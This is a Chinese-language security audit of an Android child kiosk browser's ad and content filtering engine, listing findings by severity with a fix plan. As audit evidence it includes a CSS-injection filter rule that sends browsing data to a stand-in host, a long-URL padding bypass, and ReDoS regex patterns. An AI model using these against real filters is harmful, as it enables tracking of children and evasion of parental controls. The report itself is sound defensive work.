# 网页过滤功能深度审查（2026-07-10）

> 修复状态更新（2026-07-11）：本报告记录的是修复前基线，正文中的“当前状态”和行号用于保留审计证据。经后续 remediation，P0 已完成并通过 Standard/Enhanced 双变体单测与 Debug 构建；最新状态见第 10 节。

## 1. 结论

**审查结论：REQUEST CHANGES。**

当前实现已经具备可用的工程骨架：运行时配置随 Intent 进入隔离的 `:webview` 进程，真实网页仍由原生 `FrameLayout + WebView` 承载；过滤引擎有 domain/token 索引、决策缓存、性能分位数和 WebView 进程诊断；scriptlet 也采用本地名称 allowlist，而不是直接执行订阅中的任意 JavaScript。

但它还不适合被当作可靠的“儿童网页过滤边界”。本次审查确认了会造成整站误拦、系统性漏拦、设置数据丢失和隐私泄露的缺陷。最优先的问题不是继续做 JNI/Rust 或叠加索引，而是先恢复规则语义、订阅发布原子性和运行时 fail-safe：

1. 强力预设内置的全局 `$removeparam` 规则会同时成为普通阻断规则，可能近似阻断所有 HTTP(S) 请求。
2. 远程 cosmetic selector 能逃逸 CSS 拼接并发起页面侧网络请求，使订阅方获知儿童访问的站点。
3. hosts/ABP 解析顺序、锚点/通配符/正则语义存在系统性错误；官方规则列表会出现大量静默失效或误匹配。
4. 超过 2048 字符的 URL、弹窗目标、WebSocket、Service Worker、iframe/ping/fetch 等路径可稳定绕过部分或全部过滤。
5. 预设切换和订阅更新可能丢失、回滚或复活用户配置；下载结果也没有 last-known-good 和原子发布保护。

建议将第 4 节的 P0 项作为下一次发布前置条件；在 P0 完成并补齐回归测试前，不建议把管理页中的“兼容 ABP/EasyList、uBO、AdGuard 常用语法”理解为完整或安全兼容。

## 2. 审查基线与范围

### 2.1 基线

- 仓库：`child-kiosk-browser`
- 分支：`main`
- HEAD：`3e970852faabb710330cbd072b489f78ca959d47`（`chore: release v0.3.9`）
- 审查日期：2026-07-10（Asia/Shanghai）
- 基线状态：**包含当前工作区全部未提交改动**。审查期间只新增本文档，没有修改或回退现有产品代码。
- WebView 约束：`WebViewActivity` 位于 `:webview` 进程，生产网页路径仍是 `WebViewActivity -> FrameLayout -> WebView`。

为避免报告与后续并发改动混淆，复核时过滤核心文件 SHA-1 如下：

| 文件 | SHA-1 |
| --- | --- |
| `FilterCatalog.kt` | `cb517e47abb617a3301b8ac4588f98033ad83d5f` |
| `FilterEngine.kt` | `ede2d7da0f082b28569010adb313806497f82387` |
| `FilterModels.kt` | `1fc19fff5a430cb35598502d3bd6b511b6ceff3b` |
| `FilterRepository.kt` | `6ca4a1c0a8feaaf886995401d8135f51608b75d4` |
| `FilterRuleParser.kt` | `ca8eb02ff2882c6f69a7b6a259d45b6419225b28` |
| `WebViewActivity.kt` | `e99a09e654d875a7b4fda179eaf0311bc75b05a1` |
| `AdminConsoleScreen.kt` | `beba1a3613bfe33188324883abfc0089b2916620` |

### 2.2 审查范围

- 规则解析：ABP/EasyList、uBO/AdGuard 子集、hosts、cosmetic、scriptlet、`badfilter`、`removeparam`。
- 决策语义：锚点、通配符、分隔符、正则、资源类型、party、例外与来源优先级。
- 订阅：目录与预设、下载、并发更新、存储、校验、缓存、last-known-good、自动更新。
- 跨进程与 WebView：Intent 快照、预热、缓存、请求拦截、弹窗、Service Worker、当前页面设置生效。
- 注入与安全：CSS、scriptlet、超长 URL、正则 DoS、日志广播、诊断隐私。
- UI/运维：统计口径、主线程工作、设置语义、生效反馈和测试覆盖。

### 2.3 方法与严重度

本次采用静态数据流审查、规则最小复现、官方列表语法抽样、现有单测和历史性能诊断交叉验证。官方列表数量是 2026-07-10 对当前上游文本的粗扫，适合说明影响面，不应作为永久固定的兼容率基线。

- **Critical**：可导致默认/预设功能大面积失效，或跨越明确的隐私/信任边界；发布前必须修复。
- **High**：稳定误拦、绕过、数据丢失或主要能力失真；应在下一版本前修复。
- **Medium**：边界错误、可维护性/性能风险或诊断失真；进入 P1/P2。
- **Low**：体验和工程优化，不单独阻塞发布。

## 3. Findings

### 3.1 Critical

#### C-01 `$removeparam` 同时进入普通阻断索引，强力预设可能阻断几乎所有请求

**证据**

- 强力预设 starter rules 内置全局规则 `*$removeparam=...`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:123`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:130`。
- 构建阶段 `blocking` 包含所有非例外、非 important 规则；`removeParam` 只是 `blocking` 的子集，二者都创建索引：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:492`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:503`。
- `decide()` 仍会扫描普通 blocking index：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:373`。
- 现有测试只断言 URL 被清理，没有断言普通请求仍为 ALLOW：`app/src/test/java/site/anzz/childkiosk/util/filter/FilterEngineTest.kt:95`。

**最小复现**

```text
规则：*$removeparam=utm_source
请求：https://example.com/app.js
预期：ALLOW（该规则只声明 URL 转换）
实际：BLOCK
```

**影响**

启用 STRONG 时，主文档和子资源都可能被替换为空响应，表现为白屏、样式/脚本全部失效。任何远程 URL Tracking 列表中的 modifier-only 规则也可能触发同类事故。

**建议**

- modifier-only 规则不得进入 `importantIndex`、`exceptionIndex` 或 `blockingIndex`；为 URL transformation 建立独立 AST 和决策阶段。
- 明确定义 `@@...$removeparam`、规则域限制、GET/POST、签名/OAuth URL 和冲突优先级。
- 回归测试必须同时验证 `cleanUrlForNavigation()` 有效和 `decide(normalRequest) == ALLOW`。

#### C-02 Cosmetic selector 可逃逸 CSS 拼接，远程订阅可泄露浏览站点

**证据**

- parser 原样保存 `##` 后 selector：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:189`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:215`。
- “安全”检查只屏蔽少数扩展选择器关键字，不拒绝 `{}`、`;`、`@import`、`url()`、控制字符或转义：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:784`。
- selector 被直接 join 后追加声明块并写入 `<style>`：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4699`、`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4721`。

**最小复现**

```text
victim.example##html { background-image:url(https://list-owner.example/p?victim); } body
```

拼接结果包含两个合法 CSS 块。`JSONObject.quote()` 只能保护 JavaScript 字符串边界，不能保护 CSS grammar。域名限定规则可让恶意或被攻陷的订阅源判断儿童访问了哪个站点，更复杂的属性选择器还可能形成 CSS exfiltration。

**影响**

这违反需求中“订阅源只能看到规则下载，不能接收儿童浏览历史”的信任边界：`docs/adblock_filtering_requirements.md:307`。内置 CDN 被攻陷和家长添加自定义订阅都在威胁模型内。

**建议**

- 不再用字符串黑名单判断 selector；采用经审计的 CSS selector parser，只接受单个 selector grammar。
- Kotlin 侧 fail-closed 拒绝声明块、at-rule、URL token、分号、控制字符及反斜杠混淆；CSSOM `insertRule()` 只能作为附加校验，不能代替信任边界检查。
- 修复前，对未签名/自定义订阅的 cosmetic 默认关闭或明确标记“不受信任”。
- 增加 `{}`、`;`、`@import`、`url()`、escape、控制字符和 CSS 数据外带回归用例。

### 3.2 High

#### H-01 hosts 解析优先且裸域判断过宽，静默吞掉官方 ABP 规则

**证据**

- 每行先走 `parseHostsLine()`，再走 ABP parser：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:101`。
- 单 token 只要含点、不含 `/` 且不以 `@@`/`||` 开头就被当 host：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:222`。

例如 `-ad-sidebar.$image`、`.ads.controller.js$script` 会被错误解析为 `DOMAIN_ANCHOR`，`$image/$script` 也进入所谓 host 文本，规则不再按 ABP 语义生效。2026-07-10 粗扫疑似误分类：EasyList 279 条、EasyPrivacy 64 条、AdGuard Chinese 172 条、AdGuard Mobile 23 条。

**建议**

- 默认先识别明确的 Adblock grammar；hosts 必须使用严格 hostname/IP validator，或由 source metadata 显式声明 hosts 模式。
- 支持 hosts 的 inline comment、多 alias、IDN/IP，并确保含 `$`、`*`、`^`、leading dot 等 Adblock token 的行永远不进入 hosts parser。

#### H-02 核心 ABP 锚点、分隔符、通配符和正则语义错误

**证据与复现**

- match type 使用互斥 `startsWith`/`endsWith`，无法表达双端锚：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:259`。`|https://cdn.test/foo|` 对精确 URL 返回 ALLOW。
- `findOptionSeparator()` 将 regex 内首个未转义 `$` 当 options 起点：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:295`。`/foo$/` 被截断并成为 unsupported。
- wildcard regex 只为 `SUBSTRING` 构建：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:1265`；`||example.com/ad*banner^` 的路径通配符不工作。
- domain anchor 将 path 截成普通文本并对整 URL 执行 `contains()`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:1217`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:1250`。`||example.com/foo^` 会误匹配仅 query 中出现 `foo` 的 URL。
- AdGuard 列表常见 `|http://*...` 会被 STARTS_WITH 当作字面 `*`，基本无法命中。

**影响**

UI/CHANGELOG 声称的“域名锚定、通配符、分隔符、正则”等核心能力并不可靠，且错误同时包含漏拦和误拦，不能通过增加更多订阅补偿。

**建议**

以统一 AST 表达 start/end/domain anchors、separator、wildcard 和 regex literal；编译时生成一致 matcher，不再用互斥 match type 丢失组合语义。引入 EasyList/uBO/AdGuard 官方 corpus 的 golden/differential tests，可与 `adblock-rust` 或官方期望结果对比。

#### H-03 未识别的高级 cosmetic/scriptlet 语法会降级污染网络规则

parser 只显式识别 `##`、`#@#` 和两种 scriptlet marker：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:85`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:129`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:189`。`#?#`、`#@?#`、其他 `#%#`/procedural cosmetic 形式可能继续落入 hosts/ABP parser，而不是明确计入 unsupported。

2026-07-10 粗扫相关高级规则约为：EasyList 268 条、AdGuard Chinese 248 条、AdGuard Mobile 384 条。降级为网络规则既污染兼容统计，也可能产生无意义候选或误匹配。

**建议**

在网络 parser 之前完整识别所有 `#...#` grammar family；已支持的结构化解析，未知的一律 fail-closed 为 unsupported，绝不降级成 network/hosts 规则。

#### H-04 URL 超过 2048 字符时整个过滤器 fail-open

`AdBlocker.shouldBlock()` 在解析 host 和进入 engine 前，对任意长度大于 2048 的 HTTP(S) URL 直接 ALLOW：`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:41`、`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:48`。

给原本会被 `||tracker.example^` 阻断的 URL 追加 `?pad=` 和足够长的字符即可稳定绕过，连低成本域名规则也不会执行；正常签名 URL 也可能超过 2KB。

**建议**

始终先匹配 scheme/host/domain anchor。长度限制只应用于 path/query/regex 等昂贵阶段；可对超长 URL 使用有界视图、跳过慢规则并记录诊断，不能静默 ALLOW。

#### H-05 `$popup` 检查 opener 而不是目标 URL，且丢弃用户手势

`onCreateWindow()` 在得到目标导航前就调用 helper：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4193`。helper 将 `parent.url` 同时作为 request/top-level URL，并将 `hasGesture` 固定为 false：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4803`。

规则 `||ads.example^$popup` 无法阻止 `safe.example` 执行 `window.open("https://ads.example/")`；后续 child WebView 又会把目标导航识别为 DOCUMENT，popup-only 规则仍不命中。

**建议**

先让隔离、不可见的临时 child WebView 接收 transport，在首次导航拿到 target 后用 `requestUrl=target, topLevelUrl=opener, resourceType=POPUP` 决策；允许后才注册/聚焦 tab，否则立即 stop/detach/destroy。纳入 `isUserGesture` 并限制单位时间 popup 数量。

#### H-06 声称支持的资源类型和实际 WebView 覆盖面不一致

- enum 包含 SUBDOCUMENT、WEBSOCKET、PING，但 `infer()` 从不返回 SUBDOCUMENT/PING；多数无扩展名且 `Accept: */*` 的 fetch/XHR 会成为 OTHER：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:21`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:41`。
- `infer()` 虽有 ws/wss 分支，`AdBlocker` 却在此之前放行所有非 HTTP(S)，因此该分支对真实过滤不可达：`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:41`。
- 代码库没有安装 `ServiceWorkerClient`；唯一主路径是普通 `WebViewClient.shouldInterceptRequest()`：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4059`。

**影响**

官方列表里的 `$subdocument`、`$ping`、`$websocket`、`$xmlhttprequest` 规则会系统性漏拦，管理页却把它们统计为已解析/可用，形成虚假安全感。

**建议**

- 利用可获得的 `Sec-Fetch-Dest/Mode`、Accept、main-frame/context 做保守分类，并把无法可靠识别的能力标为 partial/unsupported。
- API 24+ 安装进程级 `ServiceWorkerClient`，从原子运行时快照读取过滤配置。
- WebView 无法可靠观测的 WebSocket 边界应在兼容矩阵中明确；不要仅靠不可达的 enum 分支声称支持。若未来采用本地代理/VPN/DNS，需要单独的产品授权和安全评估。

#### H-07 URL 参数清理破坏 percent encoding 和签名 URL

`removeParamsFromUrl()` 读取 raw query，却用 decoded `uri.path`/`uri.fragment` 和 query 内容重新构建 URI：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:711`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:732`。

最小复现中 `/a%2Fb?keep=%2F` 可变为 `/a/b?keep=%252F`。这会改变路由语义、OAuth 回调、CDN/对象存储签名和教育平台的防重放参数。

**建议**

全程使用 raw authority/path/query/fragment，只删除匹配 query pair 的原始字节片段，不重编码未修改部分；默认排除非 GET、OAuth/登录/支付、已签名 URL，并提供站点级关闭清参能力。

#### H-08 切换预设会永久丢失自定义订阅

`setPreset()` 用内置 defaults 重建并覆盖完整 `KEY_SUBSCRIPTIONS`，只按内置 ID拷贝历史统计：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:96`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:110`。自定义订阅不在 defaults 中，因此切换任意预设后从设置中消失；这与 UI 的“CUSTOM 保留当前订阅”描述冲突：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:4118`。

**建议**

预设只调整内置订阅的 enable state；自定义条目、缓存文件和统计始终保留。补 LIGHT/STANDARD/STRONG/CUSTOM 往返及快速模式切换测试。

#### H-09 订阅更新用 stale 整表覆盖并发设置

更新开始时捕获整个 `current`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:153`；下载结束后基于旧列表整表保存：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:182`。更新期间 UI 仍允许切预设、切开关和删除自定义订阅：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3270`、`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3368`、`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3377`。

**影响**

下载期间的用户操作可能被回滚，已删除订阅可能复活，新的自定义订阅也可能丢失。

**建议**

发布阶段在 `Mutex`/Room transaction 内重新读取当前状态，只 patch 目标 ID；使用 generation/CAS 丢弃过期下载结果。不要用 SharedPreferences 的 read-modify-write 充当并发事务。

#### H-10 订阅没有 last-known-good，下载限制和正式文件发布不安全

- 任意 2xx body 编译后直接 `writeText()` 覆盖正式文件：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:168`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:170`。
- 不拒绝空内容、HTML 错误页、规则数异常下降或严重解析失败。
- chunked/未知长度响应先 `readText()` 全量进内存，再按字符数检查 15MB：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:799`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:812`。
- 没有 ETag/Last-Modified/SHA-256、版本代际、可信 manifest 或所有启用列表的总预算。

**影响**

短暂 CDN 错误或被攻陷源可立即替换有效列表；进程被杀/磁盘异常可能留下截断文件；大 chunked body 可造成内存压力。失败后没有可证明的上一版继续服务。

**建议**

流式、按 UTF-8 字节限流写入 staging；校验最终 HTTPS、Content-Type、非空、最小有效规则数、异常降幅、解析错误阈值和 SHA-256；完整 policy compile 成功后用 `AtomicFile`/原子 rename 发布 generation，失败继续使用上一代。内置 curated source 可进一步使用签名 manifest，未签名自定义源需显式标注风险。

#### H-11 引擎缺失或构建失败时静默全量放行

启动预热失败只写 Log：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:1906`；请求热路径找不到对应缓存引擎就返回 ALLOW：`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:73`。全局 LRU 仅保留 4 个快照：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:37`，Activity 又没有持有不可变 engine handle。

**建议**

每个 WebViewActivity/会话持有强引用的不可变引擎；更新采用原子换代。构建失败时回退 last-known-good 或 bundled 最小安全引擎，并在管理页/页面诊断显示“降级”，不能保持“已开启”外观却静默放行。

#### H-12 管理页在主线程同步读规则文件并全量编译

Compose 组合阶段直接执行 `getEngine()`：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3182`；内部同步 `readText()` 和 `FilterEngine.build()`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:403`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:471`。自定义规则编辑器每次按键也完整编译：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3412`。

完整订阅下会造成掉帧，低端设备或多列表时存在 ANR 风险。

**建议**

使用 ViewModel + `StateFlow`：文件读取放 `Dispatchers.IO`，解析/编译放 `Dispatchers.Default`，组合只展示上一版报告和进度。编辑器使用 debounce + cancellation，或改为显式“校验”。同一 cache key 增加 single-flight。

### 3.3 Medium

#### M-01 一/三方判定使用不完整的手写 public suffix 近似

`registrableDomainApprox()` 只硬编码少量二级后缀：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:382`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:389`。`good.co.jp`/`evil.co.jp`、`a.github.io`/`b.github.io`、不同 `appspot.com` 租户可能被错判为一方，导致 `$third-party` 漏拦或 `$first-party` 误杀。

项目已经依赖 Guava 并使用 `InternetDomainName`，建议统一基于 PSL/eTLD+1，单独处理 IP、localhost、IDN/punycode。

#### M-02 自定义家长例外不能覆盖订阅 `$important`

引擎固定先匹配所有 important，再匹配所有 exception：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:331`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:352`；source 虽按订阅后自定义规则加入，却没有来源层级：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:413`。这与需求规定的“家长自定义例外 > 订阅例外 > `$important`”冲突：`docs/adblock_filtering_requirements.md:247`。

应让 compiled rule 带 source tier，并按显式策略决策；不要仅依赖全局 important/exception 分桶。

#### M-03 Java regex 安全检查可被 ReDoS 结构绕过

安全检查只有 300 字符上限和 5 个字面危险片段：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:394`；随后同步调用 Java `Pattern.matcher().find()`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:1233`。`(a|aa)+`、`(a+){2,}` 等回溯结构不在黑名单中；恶意订阅和构造 URL 可造成 WebView 请求线程 CPU/电量 DoS。

建议采用 RE2/J 或等价线性时引擎；否则需要严格 AST allowlist、全局/单订阅 regex 配额、慢规则隔离和熔断，继续扩充字符串黑名单不可靠。

#### M-04 `$badfilter` canonicalization 依赖 options 原始顺序和大小写

`canonicalBadFilterTarget()` 只移除 `badfilter`，不对 options、domain lists、大小写做结构化归一：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:629`。原规则 `$script,third-party` 与禁用规则 `$third-party,script,badfilter` 不被认为相同。

应从 AST 生成 canonical key：pattern/exception + lowercased、排序后的 options/domain/exclusions，并覆盖跨订阅禁用测试。

#### M-05 Cosmetic 配额顺序和字符截断会丢站点规则或生成无效 CSS

匹配先追加 global 再追加 domain rules，然后 `.take(800)`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:559`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:585`。801 条全局规则即可挤掉更具体的网站规则；这与需求“超限优先保留站点限定规则”相反：`docs/adblock_filtering_requirements.md:242`。随后对拼好的 CSS 直接 `.take(256KB)`：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4708`，可能截断 selector/转义序列，使整组样式失效。

应先按 specificity/source/trust 排序，按完整 rule 分批生成多个 `<style>`，绝不在任意字符位置截断。

#### M-06 Cosmetic/scriptlet 不是 document-start，存在闪烁和竞态

两者通过 `evaluateJavascript()` 在 page started/finished 路径注入：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:3893`、`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4444`、`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4779`。它们可能晚于首屏广告、`window.open()` 或反拦截检测运行，SPA 后续 DOM 也不会自动重算全部规则。

在 WebViewFeature 支持时使用 document-start script；cosmetic 需有受预算限制的 MutationObserver/批处理，并在导航/销毁时清理。

#### M-07 当前页面的过滤配置只部分更新

`onNewIntent()` 已重新读取 Intent 并更新 Activity 字段：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:1770`，这是正确改进；但创建 WebView 时传入的 `runtimeConfig` 被匿名 WebViewClient 闭包捕获：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:3870`。过滤清参、请求拦截和注入仍主要使用创建时快照：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4039`、`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:4063`。新 Intent 也没有为新过滤快照重新预热 engine。

因此管理页提示“新打开的网站生效”基本合理，但复用已有 Activity/WebView 时仍可能得到旧策略或 cache miss fail-open。建议给 Activity 维护 `AtomicReference<RuntimeFilterHandle>`，现有 WebViewClient 每次读取同一不可变 handle；设置变更时后台预热并原子替换，明确“刷新当前页/新页面/重启”语义。

#### M-08 标准儿童预设的实际订阅集合与 UI/需求不一致

EasyPrivacy、AdGuard Chinese、AdGuard Mobile 都是 `defaultInStandard=false`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:148`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:158`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:168`；实际 STANDARD 仅启用 EasyList 和 local supplement：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterCatalog.kt:200`。UI 却宣称四个列表都启用：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:4116`，需求也如此定义：`docs/adblock_filtering_requirements.md:120`。

CHANGELOG 暗示这是性能折中，因此这里定性为“产品/UI 真值不一致”，不主张盲目开启四列表。应根据真机内存/正确性结果明确选择：修改预设实现，或诚实更新名称、描述和需求。

#### M-09 没有过滤订阅自动更新

Application 定时更新的是白名单订阅：`app/src/main/java/site/anzz/childkiosk/ChildKioskApplication.kt:64`；网页过滤订阅只有管理页手动“更新”：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3354`。这与每日检查、指数退避和 last-known-good 的需求不符。

完成 H-10 的版本化发布后，再用 WorkManager 实现网络约束、ETag/Last-Modified、指数退避、随机抖动和持久化错误状态；不要在当前非原子路径上直接加定时器。

#### M-10 站点例外匹配和“放行 15 分钟”语义错误

例外使用 `firstOrNull` 后缀匹配：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:250`，父域可因添加顺序遮住更具体子域。新增例外默认永久 `networkDisabled=true`：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3487`；随后“放行15分钟”通过 `copy()` 保留该永久网络放行：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3537`，按钮文字容易让家长误以为 15 分钟后网络过滤恢复。

应采用最长域名优先，分开建模永久 component overrides 与临时全量 allow，显示倒计时并清理过期项。

#### M-11 过滤总开关存在两个持久化真值

Repository 保存 `kiosk_filter_prefs.enabled`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:55`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:91`；实际运行快照又用 `KioskPrefs.limit_ad_block` 覆盖：`app/src/main/java/site/anzz/childkiosk/util/KioskPrefs.kt:769`。setter 分两次异步 `apply()`：`app/src/main/java/site/anzz/childkiosk/util/KioskPrefs.kt:1042`，管理页还重复调用 repository setter：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3249`。

应迁移为单一权威字段和一次原子更新，避免崩溃/并发时 UI 与运行态分叉。

#### M-12 大段自定义规则进入 Intent，存在 Binder transaction 上限

`FilterRuntimeSnapshot.toJson()` 原样携带全部 `customRules`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:184`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterModels.kt:192`；完整运行配置再作为单个 String extra：`app/src/main/java/site/anzz/childkiosk/util/KioskPrefs.kt:815`。编辑器没有 UTF-8 字节上限。

Intent 应只携带 generation/hash 和小型行为字段，规则文本通过 app-private immutable snapshot 文件传递；短期至少保存前按 UTF-8 字节限制并提示。

#### M-13 API 28-32 动态日志 receiver 可被其他 App 注入

API 33+ 正确使用 `RECEIVER_NOT_EXPORTED`，旧版本使用无 permission 的 `registerReceiver(receiver, filter)`：`app/src/main/java/site/anzz/childkiosk/MainActivity.kt:307`。接收端信任 `event_json` 并提交到单线程队列，而 minSdk 是 28。

同机 App 可在 Android 9-12 注入伪造 URL/规则日志并制造后台写盘负载。建议所有 API 使用 signature-level internal permission 或非导出 IPC，同时限制 JSON 字节数、字段长度、timestamp 和速率。`setPackage()` 只限制本应用广播的接收方，不能认证外部发送方。

#### M-14 聚合统计把 cosmetic/scriptlet 排除在“已编译规则”之外

aggregate `enabledRuleCount` 只等于 active network compiled count：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:497`；source report 却把 cosmetic 和 supported scriptlet 计入 enabled：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:117`。仅有 `##.ad` 时 aggregate enabled=0、source enabled=1；管理页仍显示“已编译规则 enabled/total”：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3257`。

应定义互斥且稳定的 parsed/enabled/compiled/unsupported/skipped/error 口径，并按 network/cosmetic/scriptlet/action/source 展示；编译失败也应进入 skipped/unsupported，而不只是 errors。

#### M-15 主框架阻断缺少儿童友好的解释与恢复路径

普通 domain rule 也可能阻断 DOCUMENT；当前 `emptyResponse()` 对非图片返回空 `200 text/plain`：`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:139`。安全类规则命中后没有本地解释页、命中来源和家长验证后的临时继续访问，不符合需求：`docs/adblock_filtering_requirements.md:313`。

建议区分广告子资源和安全类主框架策略；主框架仅允许明确的 `$document`、家长规则或可信安全 source 默认阻断，并显示本地、不可被页面伪造的家长解释页。

### 3.4 Low / 工程优化

- `engineCacheKey()` 包含所有站点例外及订阅展示统计，任一 override/错误文本变化都会全量重编译：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:427`。拆成“规则内容 generation/hash”和运行时 override generation。
- 相同快照是 check-then-build，没有 per-key single-flight：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRepository.kt:215`；并发预热可能重复解析。
- hot path 每请求创建 `HashSet`/`List`/`seenKeys`、lowercase URL 并排序候选：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:1087`；缓存超限整表 `clear()`：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:116`。应在 correctness 修复后用 allocation/GC 数据决定对象池、线程本地 scratch 或分段 LRU，不要先做猜测优化。
- 任一 query-sensitive rule 会全局禁用 normalized cache：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:426`。可按 query-sensitive/insensitive rule partition 决策。
- 删除自定义订阅、清空自定义规则缺少家长确认：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3377`、`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3443`。
- 诊断复制包含完整 URL/query，却没有导出隐私提醒：`app/src/main/java/site/anzz/childkiosk/ui/AdminConsoleScreen.kt:3578`，与 `docs/adblock_filtering_requirements.md:312` 不符。默认应脱敏 query/token，另提供有确认的完整导出。

## 4. 分阶段修复路线

### P0：立即止血，作为下一次发布前置条件

1. 把 `$removeparam` 从所有网络阻断索引拆出，并修复 raw URL 保真；先临时从 STRONG starter 中移除全局规则也可作为短期保险，但不能代替引擎修复。
2. 关闭不可信 cosmetic 或上线严格 selector grammar；加入 CSS 网络外带安全回归。
3. 删除 2048 字符全量 fail-open；域名规则必须始终执行。
4. 严格区分 hosts 与 Adblock 语法，未知 `#...#` 规则必须 unsupported，不能降级。
5. 修复双端锚、domain path、`*`/`^` 和 regex `$` 的核心 AST/匹配语义。
6. 预设保留自定义订阅；订阅更新改为目标 ID 原子 patch；正式规则文件采用 staging + last-known-good。
7. WebViewActivity 持有强引用 engine handle，cache miss/构建失败暴露降级状态。

### P1：正确性、覆盖面和发布工程

1. 实现 popup target 延迟决策、ServiceWorkerClient 和可观测资源类型分类；对 WebSocket 等平台限制诚实降级声明。
